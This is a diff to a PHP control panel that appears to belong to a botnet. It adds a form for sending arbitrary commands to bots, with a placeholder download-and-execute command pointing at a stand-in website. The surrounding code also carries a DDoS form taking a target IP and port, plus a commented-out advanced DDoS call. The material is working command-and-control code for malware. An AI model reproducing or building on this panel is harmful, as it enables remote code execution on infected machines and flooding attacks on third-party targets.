@@ -228,10 +228,12 @@
 
 
 						function Scommand_json_command(){
-							$command = null;
+							if(isset($_POST["cb_command"])){
+								$command = $_POST["cb_command"];
 
-							if(isset($command)){
 								Spend_command("command", $command);
+							}else{
+								return false;
 							}
 
 						}
@@ -239,6 +241,11 @@
 						// Spend_command('ddos', 'Command_Bot.Addos', split(':', $_POST['cb_advddos'])[0], split(':', $_POST['cb_advddos'])[1], $_POST['cb_advddos_threads']);
 						//deixar so um botao de attack e ai se vc preche um form o outro nao e prenchido whatever.
 					?>
+					<h4>Command Control</h4>
+					<form method="post" onsubmit="<?php Scommand_json_command() ?>" name="command_control_form">
+						Command <input type="text" name="cb_command" placeholder="Command_Bot.Dexec{'wwww.websitefake.com', 'True', '/path/instalation/', 'False'}" required><br> <input type="submit" value="Send_Command" name="sub_command" >
+					</form>
+					<br>
 					<h4>SIMPLE DDOS ATTACK</h4>
 					<form method="post" onsubmit="<?php Scommand_json_ddos() ?>" name="cbots_ddos">
 						Target <input type="text" name="cb_ddos" placeholder="Ex: 192.168.0.10:80" required><br> Packages <input type="number" name="cb_ddos_packages" required> <input type="submit" value="Attack" name="sub_ddosattack" >
@@ -318,11 +325,6 @@
 			</div>
 		</div>
 		<div id="botom">
-			<div id="bt_image"><img src="http://i.imgur.com/3NyyE66.png" width=60px height=80px></div>
-			<div id="credit">Scheduled by Mouse_BL0ck.<br>
-				Who does not know how to program in php ?<br>
-				And it's shitting for you...  <br>
-				...yes me.<br>
 		</div>
 	</div>
 </body>
